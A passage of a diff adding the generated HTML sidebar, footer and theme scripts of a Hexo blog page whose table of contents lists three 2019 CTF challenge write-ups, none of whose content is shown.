+        <a href="https://github.com/cuokon" title="GitHub &rarr; https://github.com/cuokon" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:2804745224@qq.com" title="E-Mail &rarr; mailto:2804745224@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+
+
+
+  <div class="cc-license motion-element" itemprop="license">
+  
+  
+    
+  
+  
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+
+  <div class="links-of-blogroll motion-element links-of-blogroll-block">
+    <div class="links-of-blogroll-title">
+      <i class="fa  fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://www.fxnetw.com" title="https://www.fxnetw.com" rel="noopener" target="_blank">风雪's Blog</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://shadownb.github.io/" title="https://shadownb.github.io/" rel="noopener" target="_blank">shadow's Blog</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://www.lbx0726.com/" title="https://www.lbx0726.com/" rel="noopener" target="_blank">lbx0726's Blog</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://soyawww.github.io/" title="https://soyawww.github.io/" rel="noopener" target="_blank">soya's Blog</a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+          
+          
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#强网杯-2019-高明的黑客"><span class="nav-number">1.</span> <span class="nav-text">[强网杯 2019]高明的黑客</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#强网杯-2019-随便注"><span class="nav-number">2.</span> <span class="nav-text">[强网杯 2019]随便注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Easy-Calc"><span class="nav-number">3.</span> <span class="nav-text">[RoarCTF 2019]Easy Calc</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cuo kon</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="站点总字数">33k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+    <span title="站点阅读时长">30 分钟</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.2.0</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+    
+    
+  
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+
+
+  <script src="/js/utils.js?v=7.2.0"></script>
+
+  <script src="/js/motion.js?v=7.2.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.2.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.2.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.2.0"></script>
+<script src="/js/post-details.js?v=7.2.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.2.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.2.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+
+
+
+<script>
+  window.livereOptions = {
+    refer: '2019/12/10/ctf练习(1)/'
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+
+  
+
+</body>
+</html>
